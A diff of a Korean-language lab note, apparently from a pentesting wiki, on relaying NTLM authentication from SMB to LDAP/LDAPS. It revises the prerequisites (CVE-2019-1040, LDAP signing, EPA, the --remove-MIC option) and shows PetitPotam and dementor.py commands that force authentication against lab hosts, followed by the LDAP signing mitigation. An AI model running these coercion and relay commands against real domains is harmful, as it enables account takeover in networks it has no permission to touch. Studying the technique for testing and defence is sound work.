@@ -7,8 +7,8 @@
 ### 조건&#x20;
 
 * NTLMv2 SMB -> LDAP: 타겟이 CVE-2019-1040에 취약 + LDAP Signing - Enabled/Disabled (Required 면 불가능)&#x20;
-* NTLMv2 SMB -> LDAPS:  타겟이 CVE-2019-1040에 취약 + LDAP Signing - Disabled (Enabled/Required 면 불가능)
-* NTLMv1 SMB -> LDAP: 조건 없음, 가능. 타겟이 CVE-2019-1040에 취약하지 않더라도 `--remove-MIC` 로 MIC 필드 제거 가능.&#x20;
+* NTLMv2 SMB -> LDAPS:  타겟이 CVE-2019-1040에 취약 + EPA Disabled (LDAP Signing 은 enabled/disabled/required 상관 없이  가능)&#x20;
+* NTLMv1 SMB -> LDAP: LDAP Signing Enabled/Disabled (Required 면  불가능). 타겟이 CVE-2019-1040에 취약하지 않더라도 `--remove-MIC` 로 MIC 필드 제거 가능.&#x20;
 * NTLMv1 SMB -> LDAPS: 조건 없음, 가능. 타겟이 CVE-2019-1040에 취약하지 않더라도 `--remove-MIC` 로 MIC 필드 제거 가능.&#x20;
 
 
@@ -18,7 +18,7 @@
 #### 트리거 - 강제 인증 - Petitpotam&#x20;
 
 ```
-python3 PetitPotam.py -u '' -p '' 192.168.40.132 192.168.40.160
+python3 PetitPotam.py -u '' -p '' 192.168.40.132 192.168.40.150
 ```
 
 #### 트리거- LLMNR/NBT-NS 포이즈닝&#x20;
@@ -65,4 +65,4 @@ python3 dementor.py -u low -p 'Password123!' -d choi.local 192.168.40.132 192.16
 
 `(Default Domain Controller Policy 혹은 GPO`) `> Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies >  Security Options > Domain controller: LDAP server signing requirement` - REQUIRED 로 설정&#x20;
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
